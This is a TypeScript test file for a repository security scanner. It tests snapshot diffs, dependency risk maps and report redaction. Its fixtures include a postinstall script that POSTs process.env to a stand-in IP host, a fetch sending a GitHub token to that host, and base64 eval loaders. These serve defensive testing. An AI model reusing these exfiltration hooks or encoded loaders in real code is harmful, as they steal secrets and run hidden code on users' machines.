import { describe, it, expect } from "vitest";
import { readFileSync, readdirSync, statSync } from "node:fs";
import { join, relative } from "node:path";
import { scanFiles, type RepoFile } from "../src/scanner/scan";
import { makeSnapshot, diffSnapshots, loadSnapshot, saveSnapshot, validSnapshot, MAX_SNAPSHOTS, STALE_DAYS, type SnapshotStorage } from "../src/snapshots";
import { buildDependencyMap, sortDeps } from "../src/deps";
import { buildReport, reportFilename } from "../src/report";

const DEMO = join(__dirname, "../demo-assessment");
const walk = (d: string): string[] => readdirSync(d).flatMap((f) => (statSync(join(d, f)).isDirectory() ? walk(join(d, f)) : [join(d, f)]));
const demoFiles: RepoFile[] = walk(DEMO).filter((p) => !p.endsWith(".txt")).map((p) => ({ path: relative(DEMO, p).replaceAll("\\", "/"), content: readFileSync(p, "utf8") }));
const pkg = (o: object) => ({ path: "package.json", content: JSON.stringify(o, null, 2) });
const T0 = Date.UTC(2026, 10, 1);

const memStore = () => { const data: Record<string, any> = {}; const s: SnapshotStorage & { data: typeof data } = { data, get: async (k) => (k in data ? { [k]: structuredClone(data[k]) } : {}), set: async (o) => { Object.assign(data, structuredClone(o)); } }; return s; };
const snapOf = async (files: RepoFile[], opts: { commit?: string; now?: number; issues?: any[] } = {}) => {
  const scan = scanFiles(files, { issues: opts.issues });
  return { scan, snap: await makeSnapshot("o/r", scan, files.map((f) => f.path), buildDependencyMap(files, scan.findings), { commit: opts.commit, now: opts.now ?? T0 }) };
};

describe("risky change detector", () => {
  it("snapshots hold no source code or evidence", async () => {
    const { scan, snap } = await snapOf(demoFiles);
    const text = JSON.stringify(snap);
    for (const f of scan.findings) if (f.evidence.length > 10) expect(text).not.toContain(f.evidence);
    for (const f of demoFiles) expect(text).not.toContain(f.content.slice(0, 60));
    expect(validSnapshot(snap)).toBe(true);
  });
  it("identical scans: no differences", async () => {
    const a = (await snapOf(demoFiles, { commit: "c1" })).snap, b = (await snapOf(demoFiles, { commit: "c1", now: T0 + 1000 })).snap;
    const d = diffSnapshots(a, b);
    expect([d.added, d.resolved, d.changed, d.notRechecked, d.addedDeps, d.removedDeps].map((x) => x.length)).toEqual([0, 0, 0, 0, 0, 0]);
    expect(d.sameCommit).toBe(true);
    expect(d.notes.join(" ")).toMatch(/Same commit/);
  });
  it("detects a new risky file and a new install script, and reports dates", async () => {
    const before = [pkg({ name: "x", scripts: { test: "vitest" } }), { path: "index.js", content: "console.log(1)\n" }];
    const after = [pkg({ name: "x", scripts: { test: "vitest", postinstall: "node setup.js" } }), before[1], { path: "setup.js", content: "const s = JSON.stringify(process.env);\nfetch('https://198.51.100.7/u', { method: 'POST', body: s });\n" }];
    const a = (await snapOf(before)).snap, b = (await snapOf(after, { now: T0 + 864e5 })).snap;
    const d = diffSnapshots(a, b);
    expect(d.added.some((f) => f.ruleId === "npm-lifecycle-script")).toBe(true);
    expect(d.newRiskyFiles).toContain("setup.js");
    expect(d.resolved).toEqual([]);
    expect([d.previousAt, d.currentAt]).toEqual([T0, T0 + 864e5]);
  });
  it("detects resolved findings and moved lines as changed, not new", async () => {
    const bad = { path: "a.js", content: "eval(atob(x));\n" };
    const moved = { path: "a.js", content: "// header\n\neval(atob(x));\n" };
    const a = (await snapOf([bad])).snap;
    const d1 = diffSnapshots(a, (await snapOf([moved])).snap);
    expect(d1.added).toEqual([]);
    expect(d1.changed.length).toBeGreaterThan(0);
    expect(d1.changed[0].what.join()).toMatch(/line 1 → 3/);
    const d2 = diffSnapshots(a, (await snapOf([{ path: "a.js", content: "console.log(1)\n" }])).snap);
    expect(d2.resolved.length).toBeGreaterThan(0);
    expect(d2.added).toEqual([]);
  });
  it("findings in files not inspected this time are not called resolved", async () => {
    const bad = { path: "a.js", content: "eval(atob(x));\n" };
    const a = (await snapOf([bad])).snap;
    const issue = { kind: "download-failed", path: "a.js", detail: "x" };
    const b = (await snapOf([], { issues: [issue] })).snap;
    const d = diffSnapshots(a, b, new Set(["a.js"]));
    expect(d.resolved).toEqual([]);
    expect(d.notRechecked.length).toBeGreaterThan(0);
    expect(d.notes.join(" ")).toMatch(/incomplete/);
  });
  it("detects added and removed dependencies", async () => {
    const a = (await snapOf([pkg({ dependencies: { lodash: "^4" } })])).snap;
    const d = diffSnapshots(a, (await snapOf([pkg({ dependencies: { "left-pad": "git+https://example.com/x.git" } })])).snap);
    expect(d.addedDeps).toEqual(["package.json#left-pad@git+https://example.com/x.git"]);
    expect(d.removedDeps).toEqual(["package.json#lodash@^4"]);
  });
  it("flags an old snapshot", async () => {
    const a = (await snapOf(demoFiles)).snap;
    const d = diffSnapshots(a, (await snapOf(demoFiles, { now: T0 + (STALE_DAYS + 1) * 864e5 })).snap);
    expect(d.stale).toBe(true);
  });
  it("never uses the word malicious about a change", async () => {
    const d = diffSnapshots((await snapOf([])).snap, (await snapOf(demoFiles)).snap);
    expect(JSON.stringify(d)).not.toMatch(/malicious/i);
  });
});

describe("snapshot storage", () => {
  it("first scan, then found", async () => {
    const s = memStore();
    expect(await loadSnapshot(s, "o/r")).toEqual({ state: "none" });
    const { snap } = await snapOf(demoFiles);
    expect(await saveSnapshot(s, snap)).toEqual({ ok: true });
    expect(await loadSnapshot(s, "o/r")).toEqual({ state: "found", snapshot: snap });
  });
  it("old or corrupt data is unreadable, not a crash, and is dropped on save", async () => {
    const s = memStore();
    s.data["decoy.snapshots.v1"] = { "o/r": { v: 0, slug: "o/r" }, "x/y": "junk" };
    expect(await loadSnapshot(s, "o/r")).toEqual({ state: "unreadable" });
    s.data["decoy.snapshots.v1"] = { "o/r": { ...(await snapOf([])).snap, findings: [{ ruleId: 1 }] } };
    expect(await loadSnapshot(s, "o/r")).toEqual({ state: "unreadable" });
    await saveSnapshot(s, { ...(await snapOf([])).snap, slug: "a/b" });
    expect(Object.keys(s.data["decoy.snapshots.v1"])).toEqual(["a/b"]);
  });
  it("storage failures are reported, not thrown", async () => {
    const broken: SnapshotStorage = { get: async () => { throw new Error("quota"); }, set: async () => { throw new Error("quota"); } };
    expect(await loadSnapshot(broken, "o/r")).toEqual({ state: "error", message: "quota" });
    expect(await saveSnapshot(broken, (await snapOf([])).snap)).toEqual({ ok: false, message: "quota" });
  });
  it(`keeps only the ${MAX_SNAPSHOTS} most recent repositories`, async () => {
    const s = memStore();
    const base = (await snapOf([])).snap;
    for (let i = 0; i < MAX_SNAPSHOTS + 5; i++) await saveSnapshot(s, { ...base, slug: `o/r${i}`, scannedAt: T0 + i });
    const kept = Object.keys(s.data["decoy.snapshots.v1"]);
    expect(kept).toHaveLength(MAX_SNAPSHOTS);
    expect(kept).not.toContain("o/r0");
    expect(kept).toContain(`o/r${MAX_SNAPSHOTS + 4}`);
  });
});

describe("dependency risk map", () => {
  it("joins declared dependencies to existing scanner findings without inventing any", () => {
    const files = [pkg({ name: "app", dependencies: { lodash: "^4.17.21", evil: "https://198.51.100.7/e.tgz", fork: "github:someone/fork" }, devDependencies: { weird: { version: "1" } } })];
    const scan = scanFiles(files);
    const map = buildDependencyMap(files, scan.findings);
    const by = Object.fromEntries(map.deps.map((d) => [d.name, d]));
    expect(by.lodash.status).toBe("source-checked");
    expect(by.evil.status).toBe("flagged");
    expect(by.evil.findings[0].ruleId).toBe("dependency-url");
    expect(by.fork.status).toBe("flagged");
    expect(by.weird.status).toBe("not-analysed");
    // Every flagged finding is one the scanner produced.
    for (const d of map.deps) for (const f of d.findings) expect(scan.findings).toContain(f);
    expect(sortDeps(map.deps).map((d) => d.status)).toEqual(["flagged", "flagged", "not-analysed", "source-checked"]);
  });
  it("handles monorepos, unparseable manifests and lockfile findings", () => {
    const files = [pkg({ dependencies: { a: "1" } }), { path: "packages/b/package.json", content: "{ not json" }, { path: "package-lock.json", content: '{"packages":{"node_modules/x":{"resolved":"http://198.51.100.7/x.tgz"}}}' }];
    const map = buildDependencyMap(files, scanFiles(files).findings);
    expect(map.manifests.map((m) => [m.path, m.state])).toEqual([["package.json", "parsed"], ["packages/b/package.json", "unparseable"]]);
    expect(map.lockfileFindings.length).toBe(1);
    expect(map.lockfiles).toEqual(["package-lock.json"]);
  });
  it("no package.json: empty map", () => expect(buildDependencyMap([{ path: "a.py", content: "" }], []).manifests).toEqual([]));
  it("large trees are built quickly", () => {
    const deps = Object.fromEntries(Array.from({ length: 3000 }, (_, i) => [`pkg-${i}`, `^${i}.0.0`]));
    const files = [pkg({ dependencies: deps })];
    const t = performance.now();
    const map = buildDependencyMap(files, scanFiles(files).findings);
    expect(map.deps).toHaveLength(3000);
    expect(performance.now() - t).toBeLessThan(2000);
  });
});

describe("security readiness report", () => {
  it("covers the demo scan with real evidence, dependencies and next steps", async () => {
    const scan = scanFiles(demoFiles);
    const deps = buildDependencyMap(demoFiles, scan.findings);
    const md = buildReport({ slug: "prasannaraj12/decoy-demo-assessment", commit: "5de09ab", scannedAt: T0, scan, deps });
    for (const h of ["## Summary", "## Findings by severity", "## Dependency risks", "## Changes since the previous scan", "## Recommended next steps", "## Scope and limitations"]) expect(md).toContain(h);
    expect(md).toContain("github.com/prasannaraj12/decoy-demo-assessment");
    expect(md).toContain("2026-11-01");
    expect(md).toContain("Do not run this project");
    for (const f of scan.findings) expect(md).toContain("`" + `${f.file}:${f.line}` + "`");
    expect(md).toMatch(/No previous scan of this repository/);
    expect(md).toMatch(/Nothing was installed, built or run/);
  });
  it("never calls a clean scan safe or secure", () => {
    const md = buildReport({ slug: "o/r", scannedAt: T0, scan: scanFiles([{ path: "a.js", content: "console.log(1)\n" }]) });
    expect(md).toMatch(/not a statement that the repository is safe or secure/);
    expect(md.replace(/not a statement that the repository is safe or secure/, "")).not.toMatch(/\b(is|are) (safe|secure)\b/i);
  });
  it("redacts secrets in evidence", () => {
    const token = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8";
    const scan = scanFiles([{ path: "a.js", content: `const t = "${token}"; fetch("https://198.51.100.7/x?t=" + t);\n` }]);
    expect(scan.findings.length).toBeGreaterThan(0);
    expect(buildReport({ slug: "o/r", scannedAt: T0, scan })).not.toContain(token);
  });
  it("gives different redacted values different placeholders, and the same value the same one", () => {
    const a = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=", b = "enl4d3Z1dHNycXBvbm1sa2ppaGdmZWRjYmE=";
    const scan = scanFiles([{ path: "a.js", content: `eval(Buffer.from("${a}", "base64").toString());\neval(Buffer.from("${b}", "base64").toString());\neval(Buffer.from("${a}", "base64").toString());\n` }]);
    const md = buildReport({ slug: "o/r", scannedAt: T0, scan });
    expect(md).not.toContain(a); expect(md).not.toContain(b);
    const lines = md.split("\n").filter((l) => l.includes("Evidence:") && l.includes("Buffer.from"));
    const ph = (l: string) => l.match(/\[[A-Z_]+_\d+\]/)?.[0];
    const byLine = lines.map(ph);
    expect(new Set(byLine).size).toBe(2);
  });
  it("includes changes and says new is not malicious", async () => {
    const a = (await snapOf([])).snap, b = (await snapOf(demoFiles, { now: T0 + 1 })).snap;
    const md = buildReport({ slug: "o/r", scannedAt: T0 + 1, scan: scanFiles(demoFiles), diff: diffSnapshots(a, b) });
    expect(md).toMatch(/New findings: [1-9]/);
    expect(md).toMatch(/not proof of malicious intent/);
  });
  it("escapes markdown and html in titles and paths", () => {
    const md = buildReport({ slug: "o/r", scannedAt: T0, scan: scanFiles([{ path: "<img src=x>.js", content: "eval(atob(x));\n" }]) });
    // Raw HTML may appear only inside code spans, where Markdown renders it as text.
    expect(md.replace(/`[^`\n]*`/g, "")).not.toContain("<");
    expect(md).toContain("`<img src=x>.js:1`");
  });
  it("safe filename", () => expect(reportFilename("o/r..x", T0)).toBe("decoy-report-o_r..x-2026-11-01.md"));
});
